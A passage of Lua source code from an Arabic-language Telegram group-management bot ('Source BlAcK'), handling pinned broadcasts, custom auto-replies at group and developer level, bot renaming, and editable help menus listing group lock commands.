DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
JokerText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
JokerText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
JokerText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
JokerText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
JokerText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..JokerText.." بالتثبيت \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     Source BlAcK     --
if text and (text == 'حذف رد من متعدد' or text == 'مسح رد من متعدد') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevJoker:smembers(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevJoker:set(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevJoker:sismember(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,text) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
return false
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
DevJoker:set(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevJoker:set(BlAcK..'Joker:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text and (text == 'حذف رد متعدد' or text == 'مسح رد متعدد') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevJoker:smembers(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevJoker:set(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
DevJoker:set(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevJoker:sismember(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,text) then
local Joker = "᥀︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Joker).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر ارسل الرد الاول\n᥀︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevJoker:set(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevJoker:set(BlAcK..'Joker:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevJoker:sadd(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source BlAcK     --
if text and (text == 'حذف رد' or text == 'مسح رد') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevJoker:smembers(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevJoker:set(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد' or text == 'اضافه رد' or text == 'اضافة رد') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
DevJoker:set(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevJoker:get(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevJoker:set(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevJoker:set(BlAcK..'Joker:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevJoker:sadd(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_,text)
DevJoker:set(BlAcK..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source BlAcK     --
if text and (text == 'حذف رد عام' or text == '↫ حذف رد عام ᥀' or text == 'مسح رد عام' or text == 'حذف رد للكل' or text == 'مسح رد للكل' or text == 'مسح رد مطور' or text == 'حذف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
local List = DevJoker:smembers(BlAcK.."Joker:Sudo:AllRed")
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevJoker:set(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد عام' or text == '↫ اضف رد عام ᥀' or text == 'اضف رد للكل' or text == 'اضف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:Rd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
DevJoker:set(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevJoker:get(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevJoker:set(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevJoker:set(BlAcK.."Joker:Add:AllText"..msg.sender_user_id_, text)
DevJoker:sadd(BlAcK.."Joker:Sudo:AllRed",text)
DevJoker:set(BlAcK.."DelSudoRep",text)
return false 
end end
--     Source BlAcK     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير واعلى فقط ', 1, 'md')
else
local redod = DevJoker:smembers(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevJoker:smembers(BlAcK..'Joker:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == 'حذف الردود المتعدده' or text == 'مسح الردود المتعدده') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:GpRd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المتعدده وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevJoker:smembers(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevJoker:del(BlAcK..'Joker:Text:GpTexts'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الردود المتعدده")  
return false
end
end
end
end
--     Source BlAcK     --
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevJoker:smembers(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevJoker:get(BlAcK.."Joker:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevJoker:get(BlAcK.."Joker:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevJoker:get(BlAcK.."Joker:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevJoker:get(BlAcK.."Joker:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevJoker:get(BlAcK.."Joker:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevJoker:get(BlAcK.."Joker:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevJoker:get(BlAcK.."Joker:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevJoker:get(BlAcK.."Joker:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text =='حذف الردود' or text == 'مسح الردود' or text == 'حذف ردود المدير' or text == 'مسح ردود المدير') and ChCheck(msg) then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:GpRd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevJoker:smembers(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevJoker:del(BlAcK..'Joker:Gif:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Voice:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Audio:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Photo:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Stecker:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Video:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:File:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Text:GpRed'..v..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف ردود المدير")  
return false
end
end
end
--     Source BlAcK     --
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ᥀" and SecondSudo(msg) then
local redod = DevJoker:smembers(BlAcK.."Joker:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevJoker:get(BlAcK.."Joker:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevJoker:get(BlAcK.."Joker:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevJoker:get(BlAcK.."Joker:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevJoker:get(BlAcK.."Joker:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevJoker:get(BlAcK.."Joker:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevJoker:get(BlAcK.."Joker:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevJoker:get(BlAcK.."Joker:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevJoker:get(BlAcK.."Joker:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '᥀︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == "حذف ردود المطور" or text == "حذف ردود العام" or text == "مسح ردود المطور" or text == "↫ مسح ردود العام ᥀") then
if not Bot(msg) and DevJoker:get(BlAcK..'Joker:Lock:GpRd'..msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الثانوي او اعلى فقط ', 1, 'md')
else
local redod = DevJoker:smembers(BlAcK.."Joker:Sudo:AllRed")
if #redod == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevJoker:del(BlAcK.."Joker:Add:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Gif:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Voice:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Audio:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Photo:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Stecker:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Video:AllRed"..v)
DevJoker:del(BlAcK.."Joker:File:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Text:AllRed"..v)
DevJoker:del(BlAcK.."Joker:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف ردود المطور")  
return false
end
end 
end
--     Source BlAcK     --
if text and text == "تغيير اسم البوت" and ChCheck(msg) or text and text == "وضع اسم البوت" and ChCheck(msg) or text and text == "تغير اسم البوت" and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي اسم البوت الان" ,  1, "md") 
DevJoker:set(BlAcK..'Joker:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' and ChCheck(msg) or text == 'مسح اسم البوت' and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:NameBot')
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم حذف اسم البوت'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
end end 
--     Source BlAcK     --
if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) and ChCheck(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) and ChCheck(msg) then
HelpList ={'Joker:Help','Joker:Help1','Joker:Help2','Joker:Help3','Joker:Help4','Joker:Help5','Joker:Help6'}
for i,Help in pairs(HelpList) do
DevJoker:del(BlAcK..Help) 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text == "تعيين الاوامر" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help0'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help0'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "الاوامر" and ChCheck(msg) or text == "اوامر" and ChCheck(msg) or text == "مساعده" and ChCheck(msg) then
local Help = DevJoker:get(BlAcK..'Joker:Help')
local Text = [[
᥀︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙م1 ↫ اوامر الحمايه
᥀︙م2 ↫ اوامر الادمنيه
᥀︙م3 ↫ اوامر المدراء
᥀︙م4 ↫ اوامر المنشئين
᥀︙م5 ↫ اوامر المطورين
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعيين امر م1" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م١" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م1) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help01'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help01'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help1', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوامر١" then
if not Admin(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevJoker:get(BlAcK..'Joker:Help1')
local Text = [[
᥀︙اوامر حماية المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح ↫ الروابط
᥀︙قفل • فتح ↫ المعرفات
᥀︙قفل • فتح ↫ البوتات
᥀︙قفل • فتح ↫ المتحركه
᥀︙قفل • فتح ↫ الملصقات
᥀︙قفل • فتح ↫ الملفات
᥀︙قفل • فتح ↫ الصور
᥀︙قفل • فتح ↫ الفيديو
᥀︙قفل • فتح ↫ الاونلاين
᥀︙قفل • فتح ↫ الدردشه
᥀︙قفل • فتح ↫ التوجيه
᥀︙قفل • فتح ↫ الاغاني
᥀︙قفل • فتح ↫ الصوت
᥀︙قفل • فتح ↫ الجهات
᥀︙قفل • فتح ↫ الماركداون
᥀︙قفل • فتح ↫ التكرار
᥀︙قفل • فتح ↫ الهاشتاك
᥀︙قفل • فتح ↫ التعديل
᥀︙قفل • فتح ↫ التثبيت
᥀︙قفل • فتح ↫ الاشعارات
᥀︙قفل • فتح ↫ الكلايش
᥀︙قفل • فتح ↫ الدخول
᥀︙قفل • فتح ↫ الشبكات
᥀︙قفل • فتح ↫ المواقع
᥀︙قفل • فتح ↫ الفشار
᥀︙قفل • فتح ↫ الكفر
᥀︙قفل • فتح ↫ الطائفيه
᥀︙قفل • فتح ↫ الكل
᥀︙قفل • فتح ↫ العربيه
᥀︙قفل • فتح ↫ الانكليزيه
᥀︙قفل • فتح ↫ الفارسيه
᥀︙قفل • فتح ↫ التفليش
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر حمايه اخرى ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح + الامر ↫ ⤈
᥀︙التكرار بالطرد
᥀︙التكرار بالكتم
᥀︙التكرار بالتقيد
᥀︙الفارسيه بالطرد
᥀︙البوتات بالطرد
᥀︙البوتات بالتقيد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م2" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٢" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م2) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help21'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help21'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help2', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
